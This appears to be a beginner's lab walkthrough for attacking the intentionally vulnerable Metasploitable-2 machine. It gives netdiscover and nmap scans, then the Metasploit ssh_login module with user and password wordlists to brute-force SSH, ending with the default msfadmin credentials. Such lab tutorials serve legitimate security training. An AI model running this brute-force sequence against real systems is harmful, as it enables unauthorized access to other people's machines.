Penetration Testing on Vulnerable machine
Metasploitable-2
Set Both machine on same network
Open Linux and start its terminal
Step 1:- Scan your network with netdiscover command
We Found that Ip 192.168.235.135 is the IP of our Target Machine.
Step2:- Use nmap –sS –sV –A –p1-1000
To scan port of target machine from port number 1 to 1000We See that Port Number 22/tcp whose state is open and have service SSH running on it.
Step3 :- Use msfconsole
It provide various auxiliary,payloads and exploits to enter machine
Step4 :- Search ssh_login We try to enter from port no 22 which is ssh so we search its auxiliaries.
Step5 :- Use 0 auxilirary/scanner/ssh/ssh_login.
Step6:- Show Options This command give you the information about the ssh_login auxilirary Options.
Step7 :- Now set the Options according to our recquirment.
 set RHOSTS = your target Machine IP
 set STOP_ON_SUCCESS = true
 Set USER_FILE = your user file for attack
 set PASS_FILE = your password file associated for user file
Step 8:- Show Options to check the options you set are successful.
Step 9:- Exploit it will start the execution of attack by doing continuously
striking id password of id file and pass file.
When it got the Success it stop the execution.
Step 10:- Check your user by whoami Command.
Step11:- Open the target Machine (Metasploitable-2)
Enter the ID and Pass which got success in attack
Id => msfadmin
Pass=> msfadmin
